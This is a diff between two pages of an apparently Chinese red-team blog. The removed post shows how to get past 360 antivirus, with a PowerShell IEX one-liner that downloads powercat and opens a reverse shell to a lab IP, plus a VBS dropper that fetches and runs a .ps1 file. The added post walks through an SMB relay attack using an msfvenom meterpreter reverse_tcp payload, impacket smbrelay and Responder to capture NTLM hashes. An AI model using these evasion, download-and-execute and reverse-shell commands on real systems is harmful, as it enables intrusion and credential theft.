@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>vbs绕过360用ps1反弹shell | 九世的博客</title>
+  <title>smb中继攻击 | 九世的博客</title>
   <meta name="keywords" content=" 红队实验 ">
-  <meta name="description" content="vbs绕过360用ps1反弹shell | 九世的博客">
+  <meta name="description" content="smb中继攻击 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1321,9 +1321,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-vbs绕过360用ps1反弹shell" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-smb中继攻击" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">vbs绕过360用ps1反弹shell</h1>
+        <h1 class="article-title">smb中继攻击</h1>
     
     <div class="article-meta">
         
@@ -1339,7 +1339,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-07-28 18:28:26">2019-07-28 17:33</time>
+        创建时间:<time class="date" title="更新时间: 2020-03-22 14:05:28">2020-03-22 10:24</time>
         
     </div>
     <div class="article-meta">
@@ -1361,7 +1361,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#得出来的结果"><span class="toc-text">得出来的结果</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#由于有些事情要做，晚上我会把windows10的测试补上"><span class="toc-text">由于有些事情要做，晚上我会把windows10的测试补上</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00介绍"><span class="toc-text">0x00介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01实验过程"><span class="toc-text">0x01实验过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02结论"><span class="toc-text">0x02结论</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03参考链接"><span class="toc-text">0x03参考链接</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1376,94 +1376,30 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=415593520&auto=1&height=66"></iframe>
-
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>中午开始想从360手上搞点好果汁吃。奈何360太流氓，一句拦截行天下<br><img src="https://s2.ax1x.com/2019/07/28/elTVeI.png" alt="elTVeI.png"></p>
-<h2 id="得出来的结果"><a href="#得出来的结果" class="headerlink" title="得出来的结果"></a>得出来的结果</h2><pre><code>360不拦截本机执行powershell，但是拦截其他进程调用powershell
-cmd也是一个道理
-
-是先执行被拦截的进程，被检测到然后360结束进程
-
-vbs下载只有下载保存的文件后缀不为hta、exe就不会被拦截,可以保存为txt、ps1
-有360的机子，不能将文件重命名为exe、hta
-但是，用系统本身存在的功能进行远程下载它会拦截，用第三方的远程下载器并不会拦截
-360对powershell拦截的不是内容，拦截的是参数
-</code></pre><p>ijps1</p>
-<pre><code class="powershell">IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;);powercat -c 192.168.241.147 -p 4445 -e cmd
-</code></pre>
-<p>vbs</p>
-<pre><code class="c#">Set post=CreateObject(&quot;Msxml2.XMLHTTP&quot;)
-post.Open &quot;GET&quot;,&quot;http://192.168.3.4/ij.ps1&quot;
-&#39;发送请求
-post.Send()
-Set aGet = CreateObject(&quot;ADODB.Stream&quot;)
-aGet.Mode = 3
-aGet.Type = 1
-aGet.Open()
-&#39;等待3秒，等文件下载
-wscript.sleep 3000 
-aGet.Write(post.responseBody)&#39;写数据
-aGet.SaveToFile &quot;ij.ps1&quot;,2
-
-set ws=wscript.createobject(&quot;wscript.shell&quot;)
-ret=ws.run (&quot;powershell -nologo -file ij.ps1&quot; ,3,true)
-</code></pre>
-<p>测试结果：<br><img src="https://s2.ax1x.com/2019/07/28/elTNkV.gif" alt="elTNkV.md.gif"></p>
-<p>PS:绕过是绕过，但是是落地执行</p>
-<p>py下载器</p>
-<pre><code class="python">import requests
-import optparse
-import os
-
-class zx(object):
-    def __init__(self,command):
-        self.command=command
-
-    def __call__(self,zx):
-        def wt(*args,**kwargs):
-            print(&#39;[+] 开始下载&#39;)
-            try:
-                rqt=requests.get(url=args[0],headers={&#39;user-agent&#39;:&#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36&#39;},timeout=3)
-                global value
-                value=len(rqt.content)
-                dk=open(args[1],&#39;wb&#39;)
-                dk.write(rqt.content)
-                dk.close()
-            except:
-                pass
-            if os.path.exists(args[1]):
-                jd=len(open(args[1],&#39;rb&#39;).read())
-                if jd==value:
-                    print(&#39;[+] 文件:{}下载成功&#39;.format(args[1]))
-                else:
-                    print(&#39;[-] 文件:{}下载失败，失败原因:大小不一致&#39;.format(args[1]))
-            else:
-                print(&#39;[-] 文件下载失败&#39;)
-            return zx(*args,**kwargs)
-        return wt
-
-@zx(command=&#39;calc&#39;)
-def download(url,file):
-    pass
-
-def demo():
-    usage=&#39;download.py -u [url] -s [save_filename]&#39;
-    parsersq=optparse.OptionParser(usage)
-    parsersq.add_option(&#39;-u&#39;,dest=&#39;url&#39;,help=&#39;指定要下载的URL路径&#39;)
-    parsersq.add_option(&#39;-s&#39;,dest=&#39;file_name&#39;,help=&#39;保存为什么名称&#39;)
-    (options,args)=parsersq.parse_args()
-    if options.url and options.file_name:
-        download(options.url,options.file_name)
-    else:
-        parsersq.print_help()
-        exit()
-
-if __name__ == &#39;__main__&#39;:
-    demo()
-</code></pre>
-<p>结果：<br><img src="https://s2.ax1x.com/2019/07/28/elTbAP.png" alt="elTbAP.png"></p>
-<p>360并没有拦截</p>
-<h3 id="由于有些事情要做，晚上我会把windows10的测试补上"><a href="#由于有些事情要做，晚上我会把windows10的测试补上" class="headerlink" title="由于有些事情要做，晚上我会把windows10的测试补上"></a>由于有些事情要做，晚上我会把windows10的测试补上</h3><p>windows10的话估计可以不落地…</p>
+        <h2 id="0x00介绍"><a href="#0x00介绍" class="headerlink" title="0x00介绍"></a>0x00介绍</h2><p>先知社区的文章：</p>
+<blockquote>
+<p>SMB重放攻击：当访问格式为\IP\File的时候，会默认将当前用户密码凭证送到SMB服务进行认证，失败后才弹出需要输用户密码的对话框，但此时SMB服务器已经收到了相应数据，通过抓包即能获取到用户凭证。<br>有了这个凭证，再进一步利用Hashcat等工具进行破解即有可能 得到能利用的用户密码。</p>
+</blockquote>
+<p>个人理解：<br><img src="https://s1.ax1x.com/2020/03/22/84hfyT.png" alt=""></p>
+<h2 id="0x01实验过程"><a href="#0x01实验过程" class="headerlink" title="0x01实验过程"></a>0x01实验过程</h2><p>内网有三台主机-&gt;</p>
+<pre><code>Windows server 2008 R2 DC：192.168.1.108
+Windows server 2008 R2：192.168.1.110
+Kali：192.168.1.109
+</code></pre><p>kali实现端口流量转发，域内主机(110那台)访问了攻击机的IP，输入了凭证之后。将凭证交给攻击者后，攻击机将凭证转交给DC。如果DC登录成功，则代表验证成功。将上传攻击机生成的马子并执行</p>
+<p>在kali上监听生成马子并监听msf</p>
+<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.109 LPORT=4444 -e x64/xor -i 20 -f exe -o test.exe
+</code></pre><p><img src="https://s1.ax1x.com/2020/03/22/844t74.png" alt=""></p>
+<p>使用impacket工具包里的smbrelay</p>
+<pre><code>命令格式：python smbrelay.py -h &lt;被攻击的机子&gt; -e &lt;认证成功后执行的马&gt;
+</code></pre><p>在使用server02访问kali IP<br><img src="https://s1.ax1x.com/2020/03/22/845Zgx.png" alt=""></p>
+<p>成功后会抓到正确的NTLM-HASH-HASH<br><img src="https://s1.ax1x.com/2020/03/22/844v3q.png" alt=""></p>
+<p>msf也会上线<br><img src="https://s1.ax1x.com/2020/03/22/845bM6.png" alt=""></p>
+<p>如果认证失败则返回错误信息<br><img src="https://s1.ax1x.com/2020/03/22/84Iisf.png" alt=""></p>
+<p><img src="https://s1.ax1x.com/2020/03/22/84Iwy6.png" alt=""></p>
+<h2 id="0x02结论"><a href="#0x02结论" class="headerlink" title="0x02结论"></a>0x02结论</h2><p>我认为实际上成功几率应该很低，钓鱼拿hash的方法应该更高（虽然破解hash是个问题）。先知社区那篇文章结尾那个方法，通过中继dump SAM文件里的HASH，拿到NT LM HASH后。使用wmicexec直接连接即可（虽然也是中继）<br><img src="https://s1.ax1x.com/2020/03/22/84oEX6.png" alt=""></p>
+<p>先设置responder.conf，关闭smb和http<br><img src="https://s1.ax1x.com/2020/03/22/85k7EF.md.png" alt=""></p>
+<p><img src="https://s1.ax1x.com/2020/03/22/85F0wF.png" alt=""></p>
+<h2 id="0x03参考链接"><a href="#0x03参考链接" class="headerlink" title="0x03参考链接"></a>0x03参考链接</h2><p><a href="https://www.anquanke.com/post/id/177123" target="_blank" rel="noopener">内网渗透——针对hash的攻击 - 安全客，安全资讯平台</a><br><a href="https://klionsec.github.io/2016/07/20/smb-replay-attack/" target="_blank" rel="noopener">smb重放攻击 [smb中间人] - klion’s blog</a><br><a href="https://xz.aliyun.com/t/7234" target="_blank" rel="noopener">钓鱼配合smb重放攻击 - 先知社区</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1473,12 +1409,12 @@ if __name__ == &#39;__main__&#39;:
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>vbs绕过360用ps1反弹shell</p>
+    <p><span class="copy-title">文章标题:</span>smb中继攻击</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-07-28, 17:33:08</p>
-    <p><span class="copy-title">最后更新:</span>2019-07-28, 18:28:26</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/93654a0e.html" title="vbs绕过360用ps1反弹shell">http://422926799.github.io/posts/93654a0e.html</a>
+    <p><span class="copy-title">发布时间:</span>2020-03-22, 10:24:45</p>
+    <p><span class="copy-title">最后更新:</span>2020-03-22, 14:05:28</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/99700841.html" title="smb中继攻击">http://422926799.github.io/posts/99700841.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
